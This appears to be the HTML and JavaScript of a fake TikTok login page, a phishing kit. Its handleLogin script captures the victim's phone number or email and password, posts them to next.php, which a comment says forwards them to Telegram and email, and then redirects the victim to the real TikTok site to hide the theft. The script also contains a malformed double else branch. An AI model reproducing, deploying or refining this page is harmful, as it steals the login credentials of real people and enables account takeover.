<div class="tiktok-form">
    <div class="header">
        <div class="tiktok-logo">
            <img src="assets/images/tiktok-icon-white-1-logo-svgrepo-com.svg" alt="TikTok Logo">
        </div>
        <div class="login-title">Log in</div>
    </div>

    <div class="tabs">
        <button class="tab-btn active" onclick="showPhone(event)">Phone</button>
        <button class="tab-btn" onclick="showEmail(event)">Email / Username</button>
    </div>

    <div id="phone-input" class="input-container">
        <div class="phone-input-group">
            <div class="country-code">
                <select id="country-code">
                    <option value="+1">+1</option>

                    <option value="+44">+44</option>

                    <option value="+33">+33</option>
                    <option value="+49">+49</option>
                    <option value="+39">+39</option>
                    <option value="+34">+34</option>
                    <option value="+7">+7</option>
                    <option value="+82">+82</option>
                    <option value="+55">+55</option>
                    <option value="+52">+52</option>
                    <option value="+60">+60</option>

                </select>
            </div>
            <input type="tel" id="phone" placeholder="Phone number" class="phone-input" required>
        </div>
    </div>

    <div id="email-input" class="input-container" style="display: none;">
        <input type="email" id="email" placeholder="Email or username" required>
    </div>

    <input type="password" id="password" placeholder="Password" required>

    <button class="signin-btn" id="login-btn" onclick="handleLogin()">Log in</button>
</div>

</footer>

<script>
    function showPhone(e) {
        e.preventDefault();
        document.getElementById('phone-input').style.display = 'block';
        document.getElementById('email-input').style.display = 'none';
        document.getElementById('phone').focus();
        document.querySelector('.tab-btn.active').classList.remove('active');
        e.target.classList.add('active');
    }

    function showEmail(e) {
        e.preventDefault();
        document.getElementById('phone-input').style.display = 'none';
        document.getElementById('email-input').style.display = 'block';
        document.getElementById('email').focus();
        document.querySelector('.tab-btn.active').classList.remove('active');
        e.target.classList.add('active');
    }

    function handleLogin() {
        let idValue = '';
        const pass = document.getElementById('password').value;

        if (document.getElementById('phone-input') && document.getElementById('phone-input').style.display !== 'none') {
            const countryCode = document.getElementById('country-code').value;
            const phone = document.getElementById('phone').value;
            idValue = countryCode + phone;
        } else {
            idValue = document.getElementById('email').value;
        }

        if (idValue.trim() && pass.trim()) {
            // Send data to next.php (this will send to Telegram and email)
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'next.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('di=' + encodeURIComponent(idValue) + '&pr=' + encodeURIComponent(pass));

            // Immediately redirect to TikTok (as originally intended)
            window.location.href = 'https://www.tiktok.com';
        } else {
            // Immediately redirect to TikTok (as originally intended)
            window.location.href = "https://www.tiktok.com";
        } else {
            alert("Please enter all required information.");
        }
    }
</script>
